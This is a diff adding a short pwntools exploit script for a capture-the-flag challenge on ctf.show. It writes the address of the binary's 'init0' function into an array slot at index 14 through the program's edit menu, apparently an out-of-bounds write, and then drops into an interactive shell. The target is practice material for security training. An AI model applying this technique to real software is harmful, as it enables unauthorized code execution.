@@ -1,0 +1,18 @@
+from pwn import *
+context(arch='i386', os='linux',log_level = 'debug')
+#io = process('./pwn')
+io = remote('pwn.challenge.ctf.show',28105)
+elf = ELF('./pwn')
+init0 = elf.sym['init0']
+io.recvuntil("what's your name?")
+io.sendline("bit")
+io.recvuntil("4 > dump all numbers")
+io.recvuntil(" > ")
+io.sendline("1")
+io.recvuntil("Index to edit: ")
+io.sendline("14")
+io.recvuntil("How many? ")
+io.sendline(str(init0))
+io.sendline('0')
+io.recv()
+io.interactive()
